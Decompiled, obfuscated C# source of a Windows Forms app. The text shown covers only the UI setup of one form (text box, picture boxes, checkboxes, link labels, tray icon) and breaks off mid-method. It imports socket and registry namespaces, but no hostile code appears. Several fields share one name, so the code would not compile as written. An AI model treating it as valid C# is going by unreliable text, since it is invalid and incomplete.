using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Resources;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace A;

public class A : Form
{
	private Socket m_A;

	private TextBox m_A;

	private PictureBox m_A;

	private CheckBox m_A;

	private CheckBox m_a;

	private PictureBox m_a;

	private PictureBox m_B;

	private PictureBox m_b;

	private LinkLabel m_A;

	private LinkLabel m_a;

	private NotifyIcon m_A;

	private ComboBox m_A;

	private Label m_A;

	private Label m_a;

	private Label m_B;

	private PictureBox m_C;

	private IContainer m_A;

	public A()
	{
		this.A();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && this.m_A != null)
		{
			this.m_A.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void A()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_03a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b3: Expected O, but got Unknown
		//IL_03fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0406: Expected O, but got Unknown
		//IL_0417: Unknown result type (might be due to invalid IL or missing references)
		//IL_0421: Expected O, but got Unknown
		//IL_059e: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a8: Expected O, but got Unknown
		//IL_0641: Unknown result type (might be due to invalid IL or missing references)
		//IL_064b: Expected O, but got Unknown
		//IL_065c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0666: Expected O, but got Unknown
		//IL_080f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0819: Expected O, but got Unknown
		//IL_08b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_08bc: Expected O, but got Unknown
		//IL_08cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d7: Expected O, but got Unknown
		//IL_0a64: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a6e: Expected O, but got Unknown
		//IL_0ab7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac1: Expected O, but got Unknown
		//IL_0ad2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0adc: Expected O, but got Unknown
		//IL_0c54: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c5e: Expected O, but got Unknown
		//IL_0ca7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb1: Expected O, but got Unknown
		//IL_0cc2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccc: Expected O, but got Unknown
		//IL_0e44: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e4e: Expected O, but got Unknown
		//IL_0e97: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea1: Expected O, but got Unknown
		//IL_0eb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ebc: Expected O, but got Unknown
		//IL_1098: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a2: Expected O, but got Unknown
		//IL_10b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_10bd: Expected O, but got Unknown
		//IL_1127: Unknown result type (might be due to invalid IL or missing references)
		//IL_1220: Unknown result type (might be due to invalid IL or missing references)
		//IL_122a: Expected O, but got Unknown
		//IL_12f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_12fb: Expected O, but got Unknown
		//IL_130c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1316: Expected O, but got Unknown
		//IL_1380: Unknown result type (might be due to invalid IL or missing references)
		//IL_1479: Unknown result type (might be due to invalid IL or missing references)
		//IL_1483: Expected O, but got Unknown
		//IL_1494: Unknown result type (might be due to invalid IL or missing references)
		//IL_149e: Expected O, but got Unknown
		//IL_1533: Unknown result type (might be due to invalid IL or missing references)
		//IL_153d: Expected O, but got Unknown
		//IL_1586: Unknown result type (might be due to invalid IL or missing references)
		//IL_1590: Expected O, but got Unknown
		//IL_178d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1797: Expected O, but got Unknown
		//IL_17a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_17b2: Expected O, but got Unknown
		//IL_1993: Unknown result type (might be due to invalid IL or missing references)
		//IL_199d: Expected O, but got Unknown
		//IL_19ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_19b8: Expected O, but got Unknown
		//IL_1b99: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ba3: Expected O, but got Unknown
		//IL_1bb4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bbe: Expected O, but got Unknown
		//IL_1d4b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d55: Expected O, but got Unknown
		//IL_1d9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1da8: Expected O, but got Unknown
		//IL_1db9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dc3: Expected O, but got Unknown
		//IL_1f78: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f82: Expected O, but got Unknown
		//IL_206e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2078: Expected O, but got Unknown
		//IL_208b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2095: Expected O, but got Unknown
		this.m_A = new Container();
		ResourceManager resourceManager = new ResourceManager(typeof(A));
		this.m_A = new TextBox();
		this.m_A = new PictureBox();
		this.m_A = new CheckBox();
		this.m_a = new CheckBox();
		this.m_a = new PictureBox();
		this.m_B = new PictureBox();
		this.m_b = new PictureBox();
		this.m_A = new LinkLabel();
		this.m_a = new LinkLabel();
		this.m_A = new NotifyIcon(this.m_A);
		this.m_A = new ComboBox();
		this.m_A = new Label();
		this.m_a = new Label();
		this.m_B = new Label();
		this.m_C = new PictureBox();
		((Control)this).SuspendLayout();
		((Control)this.m_A).set_AccessibleDescription((string)resourceManager.GetObject("textBox2.AccessibleDescription"));
		((Control)this.m_A).set_AccessibleName((string)resourceManager.GetObject("textBox2.AccessibleName"));
		((Control)this.m_A).set_Anchor((AnchorStyles)resourceManager.GetObject("textBox2.Anchor"));
		((TextBoxBase)this.m_A).set_AutoSize((bool)resourceManager.GetObject("textBox2.AutoSize"));
		((Control)this.m_A).set_BackColor(SystemColors.Window);
		((Control)this.m_A).set_BackgroundImage((Image)resourceManager.GetObject("textBox2.BackgroundImage"));
		((Control)this.m_A).set_Dock((DockStyle)resourceManager.GetObject("textBox2.Dock"));
		((Control)this.m_A).set_Enabled((bool)resourceManager.GetObject("textBox2.Enabled"));
		((Control)this.m_A).set_Font((Font)resourceManager.GetObject("textBox2.Font"));
		((Control)this.m_A).set_ForeColor(Color.Black);
		((Control)this.m_A).set_ImeMode((ImeMode)resourceManager.GetObject("textBox2.ImeMode"));
		((Control)this.m_A).set_Location((Point)resourceManager.GetObject("textBox2.Location"));
		((TextBoxBase)this.m_A).set_MaxLength((int)resourceManager.GetObject("textBox2.MaxLength"));
		((TextBoxBase)this.m_A).set_Multiline((bool)resourceManager.GetObject("textBox2.Multiline"));
		((Control)this.m_A).set_Name("textBox2");
		this.m_A.set_PasswordChar((char)resourceManager.GetObject("textBox2.PasswordChar"));
		((Control)this.m_A).set_RightToLeft((RightToLeft)resourceManager.GetObject("textBox2.RightToLeft"));
		this.m_A.set_ScrollBars((ScrollBars)resourceManager.GetObject("textBox2.ScrollBars"));
		((Control)this.m_A).set_Size((Size)resourceManager.GetObject("textBox2.Size"));
		((Control)this.m_A).set_TabIndex((int)resourceManager.GetObject("textBox2.TabIndex"));
		((Control)this.m_A).set_Text(resourceManager.GetString("textBox2.Text"));
		this.m_A.set_TextAlign((HorizontalAlignment)resourceManager.GetObject("textBox2.TextAlign"));
		((Control)this.m_A).set_Visible((bool)resourceManager.GetObject("textBox2.Visible"));
		((TextBoxBase)this.m_A).set_WordWrap((bool)resourceManager.GetObject("textBox2.WordWrap"));
		((Control)this.m_A).set_AccessibleDescription((string)resourceManager.GetObject("pictureBox1.AccessibleDescription"));
		((Control)this.m_A).set_AccessibleName((string)resourceManager.GetObject("pictureBox1.AccessibleName"));
		((Control)this.m_A).set_Anchor((AnchorStyles)resourceManager.GetObject("pictureBox1.Anchor"));
		((Control)this.m_A).set_BackgroundImage((Image)resourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)this.m_A).set_Dock((DockStyle)resourceManager.GetObject("pictureBox1.Dock"));
		((Control)this.m_A).set_Enabled((bool)resourceManager.GetObject("pictureBox1.Enabled"));
		((Control)this.m_A).set_Font((Font)resourceManager.GetObject("pictureBox1.Font"));
		this.m_A.set_Image((Image)(Bitmap)resourceManager.GetObject("pictureBox1.Image"));
		this.m_A.set_ImeMode((ImeMode)resourceManager.GetObject("pictureBox1.ImeMode"));
		((Control)this.m_A).set_Location((Point)resourceManager.GetObject("pictureBox1.Location"));
		((Control)this.m_A).set_Name("pictureBox1");
		((Control)this.m_A).set_RightToLeft((RightToLeft)resourceManager.GetObject("pictureBox1.RightToLeft"));
		((Control)this.m_A).set_Size((Size)resourceManager.GetObject("pictureBox1.Size"));
		this.m_A.set_SizeMode((PictureBoxSizeMode)resourceManager.GetObject("pictureBox1.SizeMode"));
		this.m_A.set_TabIndex((int)resourceManager.GetObject("pictureBox1.TabIndex"));
		this.m_A.set_TabStop(false);
		((Control)this.m_A).set_Text(resourceManager.GetString("pictureBox1.Text"));
		((Control)this.m_A).set_Visible((bool)resourceManager.GetObject("pictureBox1.Visible"));
		((Control)this.m_A).set_AccessibleDescription((string)resourceManager.GetObject("checkBox1.AccessibleDescription"));
		((Control)this.m_A).set_AccessibleName((string)resourceManager.GetObject("checkBox1.AccessibleName"));
		((Control)this.m_A).set_Anchor((AnchorStyles)resourceManager.GetObject("checkBox1.Anchor"));
		this.m_A.set_Appearance((Appearance)resourceManager.GetObject("checkBox1.Appearance"));
		((Control)this.m_A).set_BackgroundImage((Image)resourceManager.GetObject("checkBox1.BackgroundImage"));
		this.m_A.set_CheckAlign((ContentAlignment)resourceManager.GetObject("checkBox1.CheckAlign"));
		this.m_A.set_Checked(true);
		this.m_A.set_CheckState((CheckState)1);
		((Control)this.m_A).set_Dock((DockStyle)resourceManager.GetObject("checkBox1.Dock"));
		((Control)this.m_A).set_Enabled((bool)resourceManager.GetObject("checkBox1.Enabled"));
		((ButtonBase)this.m_A).set_FlatStyle((FlatStyle)resourceManager.GetObject("checkBox1.FlatStyle"));
		((Control)this.m_A).set_Font((Font)resourceManager.GetObject("checkBox1.Font"));
		((ButtonBase)this.m_A).set_Image((Image)resourceManager.GetObject("checkBox1.Image"));
		((ButtonBase)this.m_A).set_ImageAlign((ContentAlignment)resourceManager.GetObject("checkBox1.ImageAlign"));
		((ButtonBase)this.m_A).set_ImageIndex((int)resourceManager.GetObject("checkBox1.ImageIndex"));
		((ButtonBase)this.m_A).set_ImeMode((ImeMode)resourceManager.GetObject("checkBox1.ImeMode"));
		((Control)this.m_A).set_Location((Point)resourceManager.GetObject("checkBox1.Location"));
		((Control)this.m_A).set_Name("checkBox1");
		((Control)this.m_A).set_RightToLeft((RightToLeft)resourceManager.GetObject("checkBox1.RightToLeft"));
		((Control)this.m_A).set_Size((Size)resourceManager.GetObject("checkBox1.Size"));
		((Control)this.m_A).set_TabIndex((int)resourceManager.GetObject("checkBox1.TabIndex"));
		((Control)this.m_A).set_Text(resourceManager.GetString("checkBox1.Text"));
		((ButtonBase)this.m_A).set_TextAlign((ContentAlignment)resourceManager.GetObject("checkBox1.TextAlign"));
		((Control)this.m_A).set_Visible((bool)resourceManager.GetObject("checkBox1.Visible"));
		((Control)this.m_a).set_AccessibleDescription((string)resourceManager.GetObject("checkBox2.AccessibleDescription"));
		((Control)this.m_a).set_AccessibleName((string)resourceManager.GetObject("checkBox2.AccessibleName"));
		((Control)this.m_a).set_Anchor((AnchorStyles)resourceManager.GetObject("checkBox2.Anchor"));
		this.m_a.set_Appearance((Appearance)resourceManager.GetObject("checkBox2.Appearance"));
		((Control)this.m_a).set_BackgroundImage((Image)resourceManager.GetObject("checkBox2.BackgroundImage"));
		this.m_a.set_CheckAlign((ContentAlignment)resourceManager.GetObject("checkBox2.CheckAlign"));
		this.m_a.set_Checked(true);
		this.m_a.set_CheckState((CheckState)1);
		((Control)this.m_a).set_Dock((DockStyle)resourceManager.GetObject("checkBox2.Dock"));
		((Control)this.m_a).set_Enabled((bool)resourceManager.GetObject("checkBox2.Enabled"));
		((ButtonBase)this.m_a).set_FlatStyle((FlatStyle)resourceManager.GetObject("checkBox2.FlatStyle"));
		((Control)this.m_a).set_Font((Font)resourceManager.GetObject("checkBox2.Font"));
		((ButtonBase)this.m_a).set_Image((Image)resourceManager.GetObject("checkBox2.Image"));
		((ButtonBase)this.m_a).set_ImageAlign((ContentAlignment)resourceManager.GetObject("checkBox2.ImageAlign"));
		((ButtonBase)this.m_a).set_ImageIndex((int)resourceManager.GetObject("checkBox2.ImageIndex"));
		((ButtonBase)this.m_a).set_ImeMode((ImeMode)resourceManager.GetObject("checkBox2.ImeMode"));
		((Control)this.m_a).set_Location((Point)resourceManager.GetObject("checkBox2.Location"));
		((Control)this.m_a).set_Name("checkBox2");
		((Control)this.m_a).set_RightToLeft((RightToLeft)resourceManager.GetObject("checkBox2.RightToLeft"));
		((Control)this.m_a).set_Size((Size)resourceManager.GetObject("checkBox2.Size"));
		((Control)this.m_a).set_TabIndex((int)resourceManager.GetObject("checkBox2.TabIndex"));
		((Control)this.m_a).set_Text(resourceManager.GetString("checkBox2.Text"));
		((ButtonBase)this.m_a).set_TextAlign((ContentAlignment)resourceManager.GetObject("checkBox2.TextAlign"));
		((Control)this.m_a).set_Visible((bool)resourceManager.GetObject("checkBox2.Visible"));
		((Control)this.m_a).set_AccessibleDescription((string)resourceManager.GetObject("pictureBox2.AccessibleDescription"));
		((Control)this.m_a).set_AccessibleName((string)resourceManager.GetObject("pictureBox2.AccessibleName"));
		((Control)this.m_a).set_Anchor((AnchorStyles)resourceManager.GetObject("pictureBox2.Anchor"));
		((Control)this.m_a).set_BackgroundImage((Image)resourceManager.GetObject("pictureBox2.BackgroundImage"));
		((Control)this.m_a).set_Dock((DockStyle)resourceManager.GetObject("pictureBox2.Dock"));
		((Control)this.m_a).set_Enabled((bool)resourceManager.GetObject("pictureBox2.Enabled"));
		((Control)this.m_a).set_Font((Font)resourceManager.GetObject("pictureBox2.Font"));
		this.m_a.set_Image((Image)(Bitmap)resourceManager.GetObject("pictureBox2.Image"));
		this.m_a.set_ImeMode((ImeMode)resourceManager.GetObject("pictureBox2.ImeMode"));
		((Control)this.m_a).set_Location((Point)resourceManager.GetObject("pictureBox2.Location"));
		((Control)this.m_a).set_Name("pictureBox2");
		((Control)this.m_a).set_RightToLeft((RightToLeft)resourceManager.GetObject("pictureBox2.RightToLeft"));
		((Control)this.m_a).set_Size((Size)resourceManager.GetObject("pictureBox2.Size"));
		this.m_a.set_SizeMode((PictureBoxSizeMode)resourceManager.GetObject("pictureBox2.SizeMode"));
		this.m_a.set_TabIndex((int)resourceManager.GetObject("pictureBox2.TabIndex"));
		this.m_a.set_TabStop(false);
		((Control)this.m_a).set_Text(resourceManager.GetString("pictureBox2.Text"));
		((Control)this.m_a).set_Visible((bool)resourceManager.GetObject("pictureBox2.Visible"));
		((Control)this.m_a).add_Click((EventHandler)B);
		((Control)this.m_B).set_AccessibleDescription((string)resourceManager.GetObject("pictureBox3.AccessibleDescription"));
		((Control)this.m_B).set_AccessibleName((string)resourceManager.GetObject("pictureBox3.AccessibleName"));
		((Control)this.m_B).set_Anchor((AnchorStyles)resourceManager.GetObject("pictureBox3.Anchor"));
		((Control)this.m_B).set_BackgroundImage((Image)resourceManager.GetObject("pictureBox3.BackgroundImage"));
		((Control)this.m_B).set_Dock((DockStyle)resourceManager.GetObject("pictureBox3.Dock"));
		((Control)this.m_B).set_Enabled((bool)resourceManager.GetObject("pictureBox3.Enabled"));
		((Control)this.m_B).set_Font((Font)resourceManager.GetObject("pictureBox3.Font"));
		this.m_B.set_Image((Image)(Bitmap)resourceManager.GetObject("pictureBox3.Image"));
		this.m_B.set_ImeMode((ImeMode)resourceManager.GetObject("pictureBox3.ImeMode"));
		((Control)this.m_B).set_Location((Point)resourceManager.GetObject("pictureBox3.Location"));
		((Control)this.m_B).set_Name("pictureBox3");
		((Control)this.m_B).set_RightToLeft((RightToLeft)resourceManager.GetObject("pictureBox3.RightToLeft"));
		((Control)this.m_B).set_Size((Size)resourceManager.GetObject("pictureBox3.Size"));
		this.m_B.set_SizeMode((PictureBoxSizeMode)resourceManager.GetObject("pictureBox3.SizeMode"));
		this.m_B.set_TabIndex((int)resourceManager.GetObject("pictureBox3.TabIndex"));
		this.m_B.set_TabStop(false);
		((Control)this.m_B).set_Text(resourceManager.GetString("pictureBox3.Text"));
		((Control)this.m_B).set_Visible((bool)resourceManager.GetObject("pictureBox3.Visible"));
		((Control)this.m_B).add_Click((EventHandler)b);
		((Control)this.m_b).set_AccessibleDescription((string)resourceManager.GetObject("pictureBox4.AccessibleDescription"));
		((Control)this.m_b).set_AccessibleName((string)resourceManager.GetObject("pictureBox4.AccessibleName"));
		((Control)this.m_b).set_Anchor((AnchorStyles)resourceManager.GetObject("pictureBox4.Anchor"));
		((Control)this.m_b).set_BackgroundImage((Image)resourceManager.GetObject("pictureBox4.BackgroundImage"));
		((Control)this.m_b).set_Dock((DockStyle)resourceManager.GetObject("pictureBox4.Dock"));
		((Control)this.m_b).set_Enabled((bool)resourceManager.GetObject("pictureBox4.Enabled"));
		((Control)this.m_b).set_Font((Font)resourceManager.GetObject("pictureBox4.Font"));
		this.m_b.set_Image((Image)(Bitmap)resourceManager.GetObject("pictureBox4.Image"));
		this.m_b.set_ImeMode((ImeMode)resourceManager.GetObject("pictureBox4.ImeMode"));
		((Control)this.m_b).set_Location((Point)resourceManager.GetObject("pictureBox4.Location"));
		((Control)this.m_b).set_Name("pictureBox4");
		((Control)this.m_b).set_RightToLeft((RightToLeft)resourceManager.GetObject("pictureBox4.RightToLeft"));
		((Control)this.m_b).set_Size((Size)resourceManager.GetObject("pictureBox4.Size"));
		this.m_b.set_SizeMode((PictureBoxSizeMode)resourceManager.GetObject("pictureBox4.SizeMode"));
		this.m_b.set_TabIndex((int)resourceManager.GetObject("pictureBox4.TabIndex"));
		this.m_b.set_TabStop(false);
		((Control)this.m_b).set_Text(resourceManager.GetString("pictureBox4.Text"));
		((Control)this.m_b).set_Visible((bool)resourceManager.GetObject("pictureBox4.Visible"));
		((Control)this.m_b).add_Click((EventHandler)C);
		((Control)this.m_A).set_AccessibleDescription((string)resourceManager.GetObject("linkLabel1.AccessibleDescription"));
		((Control)this.m_A).set_AccessibleName((string)resourceManager.GetObject("linkLabel1.AccessibleName"));
		this.m_A.set_ActiveLinkColor(Color.Blue);
		((Control)this.m_A).set_Anchor((AnchorStyles)resourceManager.GetObject("linkLabel1.Anchor"));
		((Label)this.m_A).set_AutoSize((bool)resourceManager.GetObject("linkLabel1.AutoSize"));
		((Control)this.m_A).set_Dock((DockStyle)resourceManager.GetObject("linkLabel1.Dock"));
		((Control)this.m_A).set_Enabled((bool)resourceManager.GetObject("linkLabel1.Enabled"));
		((Control)this.m_A).set_Font((Font)resourceManager.GetObject("linkLabel1.Font"));
		((Label)this.m_A).set_Image((Image)resourceManager.GetObject("linkLabel1.Image"));
		((Label)this.m_A).set_ImageAlign((ContentAlignment)resourceManager.GetObject("linkLabel1.ImageAlign"));
		((Label)this.m_A).set_ImageIndex((int)resourceManager.GetObject("linkLabel1.ImageIndex"));
		((Label)this.m_A).set_ImeMode((ImeMode)resourceManager.GetObject("linkLabel1.ImeMode"));
		this.m_A.set_LinkArea((LinkArea)resourceManager.GetObject("linkLabel1.LinkArea"));
		((Control)this.m_A).set_Location((Point)resourceManager.GetObject("linkLabel1.Location"));
		((Control)this.m_A).set_Name("linkLabel1");
		((Control)this.m_A).set_RightToLeft((RightToLeft)resourceManager.GetObject("linkLabel1.RightToLeft"));
		((Control)this.m_A).set_Size((Size)resourceManager.GetObject("linkLabel1.Size"));
		((Control)this.m_A).set_TabIndex((int)resourceManager.GetObject("linkLabel1.TabIndex"));
		((Label)this.m_A).set_TabStop(true);
		((Control)this.m_A).set_Text(resourceManager.GetString("linkLabel1.Text"));
		((Label)this.m_A).set_TextAlign((ContentAlignment)resourceManager.GetObject("linkLabel1.TextAlign"));
		((Control)this.m_A).set_Visible((bool)resourceManager.GetObject("linkLabel1.Visible"));
		this.m_A.add_LinkClicked(new LinkLabelLinkClickedEventHandler(A));
		((Control)this.m_a).set_AccessibleDescription((string)resourceManager.GetObject("linkLabel2.AccessibleDescription"));
		((Control)this.m_a).set_AccessibleName((string)resourceManager.GetObject("linkLabel2.AccessibleName"));
		this.m_a.set_ActiveLinkColor(Color.Blue);
		((Control)this.m_a).set_Anchor((AnchorStyles)resourceManager.GetObject("linkLabel2.Anchor"));
		((Label)this.m_a).set_AutoSize((bool)resourceManager.GetObject("linkLabel2.AutoSize"));
		((Control)this.m_a).set_Dock((DockStyle)resourceManager.GetObject("linkLabel2.Dock"));
		((Control)this.m_a).set_Enabled((bool)resourceManager.GetObject("linkLabel2.Enabled"));
		((Control)this.m_a).set_Font((Font)resourceManager.GetObject("linkLabel2.Font"));
		((Label)this.m_a).set_Image((Image)resourceManager.GetObject("linkLabel2.Image"));
		((Label)this.m_a).set_ImageAlign((ContentAlignment)resourceManager.GetObject("linkLabel2.ImageAlign"));
		((Label)this.m_a).set_ImageIndex((int)resourceManager.GetObject("linkLabel2.ImageIndex"));
		((Label)this.m_a).set_ImeMode((ImeMode)resourceManager.GetObject("linkLabel2.ImeMode"));
		this.m_a.set_LinkArea((LinkArea)resourceManager.GetObject("linkLabel2.LinkArea"));
		((Control)this.m_a).set_Location((Point)resourceManager.GetObject("linkLabel2.Location"));
		((Control)this.m_a).set_Name("linkLabel2");
		((Control)this.m_a).set_RightToLeft((RightToLeft)resourceManager.GetObject("linkLabel2.RightToLeft"));
		((Control)this.m_a).set_Size((Size)resourceManager.GetObject("linkLabel2.Size"));
		((Control)this.m_a).set_TabIndex((int)resourceManager.GetObject("linkLabel2.TabIndex"));
		((Label)this.m_a).set_TabStop(true);
		((Control)this.m_a).set_Text(resourceManager.GetString("linkLabel2.Text"));
		((Label)this.m_a).set_TextAlign((ContentAlignment)resourceManager.GetObject("linkLabel2.TextAlign"));
		((Control)this.m_a).set_Visible((bool)resourceManager.GetObject("linkLabel2.Visible"));
		this.m_a.add_LinkClicked(new LinkLabelLinkClickedEventHandler(a));
		this.m_A.set_Icon((Icon)resourceManager.GetObject("notifyIcon1.Icon"));
		this.m_A.set_Text(resourceManager.GetString("notifyIcon1.Text"));
		this.m_A.set_Visible((bool)resourceManager.GetObject("notifyIcon1.Visible"));
		((Control)this.m_A).set_AccessibleDescription((string)resourceManager.GetObject("comboBox1.AccessibleDescription"));
		((Control)this.m_A).set_AccessibleName((string)resourceManager.GetObject("comboBox1.AccessibleName"));
		((Control)this.m_A).set_Anchor((AnchorStyles)resourceManager.GetObject("comboBox1.Anchor"));
		((Control)this.m_A).set_BackgroundImage((Image)resourceManager.GetObject("comboBox1.BackgroundImage"));
		((Control)this.m_A).set_Dock((DockStyle)resourceManager.GetObject("comboBox1.Dock"));
		((Control)this.m_A).set_Enabled((bool)resourceManager.GetObject("comboBox1.Enabled"));
		((Control)this.m_A).set_Font((Font)resourceManager.GetObject("comboBox1.Font"));
		((Control)this.m_A).set_ImeMode((ImeMode)resourceManager.GetObject("comboBox1.ImeMode"));
		this.m_A.set_IntegralHeight((bool)resourceManager.GetObject("comboBox1.IntegralHeight"));
		this.m_A.set_ItemHeight((int)resourceManager.GetObject("comboBox1.ItemHeight"));
		((Control)this.m_A).set_Location((Point)resourceManager.GetObject("comboBox1.Location"));
		this.m_A.set_MaxDropDownItems((int)resourceManager.GetObject("comboBox1.MaxDropDownItems"));
		this.m_A.set_MaxLength((int)resourceManager.GetObject("comboBox1.MaxLength"));
		((Control)this.m_A).set_Name("comboBox1");
		((Control)this.m_A).set_RightToLeft((RightToLeft)resourceManager.GetObject("comboBox1.RightToLeft"));
		((Control)this.m_A).set_Size((Size)resourceManager.GetObject("comboBox1.Size"));
		((Control)this.m_A).set_TabIndex((int)resourceManager.GetObject("comboBox1.TabIndex"));
		((Control)this.m_A).set_Text(resourceManager.GetString("comboBox1.Text"));
		((Control)this.m_A).set_Visible((bool)resourceManager.GetObject("comboBox1.Visible"));
		((Control)this.m_A).set_AccessibleDescription((string)resourceManager.GetObject("label1.AccessibleDescription"));
		((Control)this.m_A).set_AccessibleName((string)resourceManager.GetObject("label1.AccessibleName"));
		((Control)this.m_A).set_Anchor((AnchorStyles)resourceManager.GetObject("label1.Anchor"));
		this.m_A.set_AutoSize((bool)resourceManager.GetObject("label1.AutoSize"));
		((Control)this.m_A).set_Dock((DockStyle)resourceManager.GetObject("label1.Dock"));
		((Control)this.m_A).set_Enabled((bool)resourceManager.GetObject("label1.Enabled"));
		((Control)this.m_A).set_Font((Font)resourceManager.GetObject("label1.Font"));
		this.m_A.set_Image((Image)resourceManager.GetObject("label1.Image"));
		this.m_A.set_ImageAlign((ContentAlignment)resourceManager.GetObject("label1.ImageAlign"));
		this.m_A.set_ImageIndex((int)resourceManager.GetObject("label1.ImageIndex"));
		this.m_A.set_ImeMode((ImeMode)resourceManager.GetObject("label1.ImeMode"));
		((Control)this.m_A).set_Location((Point)resourceManager.GetObject("label1.Location"));
		((Control)this.m_A).set_Name("label1");
		((Control)this.m_A).set_RightToLeft((RightToLeft)resourceManager.GetObject("label1.RightToLeft"));
		((Control)this.m_A).set_Size((Size)resourceManager.GetObject("label1.Size"));
		((Control)this.m_A).set_TabIndex((int)resourceManager.GetObject("label1.TabIndex"));
		((Control)this.m_A).set_Text(resourceManager.GetString("label1.Text"));
		this.m_A.set_TextAlign((ContentAlignment)resourceManager.GetObject("label1.TextAlign"));
		((Control)this.m_A).set_Visible((bool)resourceManager.GetObject("label1.Visible"));
		((Control)this.m_a).set_AccessibleDescription((string)resourceManager.GetObject("label2.AccessibleDescription"));
		((Control)this.m_a).set_AccessibleName((string)resourceManager.GetObject("label2.AccessibleName"));
		((Control)this.m_a).set_Anchor((AnchorStyles)resourceManager.GetObject("label2.Anchor"));
		this.m_a.set_AutoSize((bool)resourceManager.GetObject("label2.AutoSize"));
		((Control)this.m_a).set_Dock((DockStyle)resourceManager.GetObject("label2.Dock"));
		((Control)this.m_a).set_Enabled((bool)resourceManager.GetObject("label2.Enabled"));
		((Control)this.m_a).set_Font((Font)resourceManager.GetObject("label2.Font"));
		this.m_a.set_Image((Image)resourceManager.GetObject("label2.Image"));
		this.m_a.set_ImageAlign((ContentAlignment)resourceManager.GetObject("label2.ImageAlign"));
		this.m_a.set_ImageIndex((int)resourceManager.GetObject("label2.ImageIndex"));
		this.m_a.set_ImeMode((ImeMode)resourceManager.GetObject("label2.ImeMode"));
		((Control)this.m_a).set_Location((Point)resourceManager.GetObject("label2.Location"));
		((Control)this.m_a).set_Name("label2");
		((Control)this.m_a).set_RightToLeft((RightToLeft)resourceManager.GetObject("label2.RightToLeft"));
		((Control)this.m_a).set_Size((Size)resourceManager.GetObject("label2.Size"));
		((Control)this.m_a).set_TabIndex((int)resourceManager.GetObject("label2.TabIndex"));
		((Control)this.m_a).set_Text(resourceManager.GetString("label2.Text"));
		this.m_a.set_TextAlign((ContentAlignment)resourceManager.GetObject("label2.TextAlign"));
		((Control)this.m_a).set_Visible((bool)resourceManager.GetObject("label2.Visible"));
		((Control)this.m_B).set_AccessibleDescription((string)resourceManager.GetObject("label3.AccessibleDescription"));
		((Control)this.m_B).set_AccessibleName((string)resourceManager.GetObject("label3.AccessibleName"));
		((Control)this.m_B).set_Anchor((AnchorStyles)resourceManager.GetObject("label3.Anchor"));
		this.m_B.set_AutoSize((bool)resourceManager.GetObject("label3.AutoSize"));
		((Control)this.m_B).set_Dock((DockStyle)resourceManager.GetObject("label3.Dock"));
		((Control)this.m_B).set_Enabled((bool)resourceManager.GetObject("label3.Enabled"));
		((Control)this.m_B).set_Font((Font)resourceManager.GetObject("label3.Font"));
		this.m_B.set_Image((Image)resourceManager.GetObject("label3.Image"));
		this.m_B.set_ImageAlign((ContentAlignment)resourceManager.GetObject("label3.ImageAlign"));
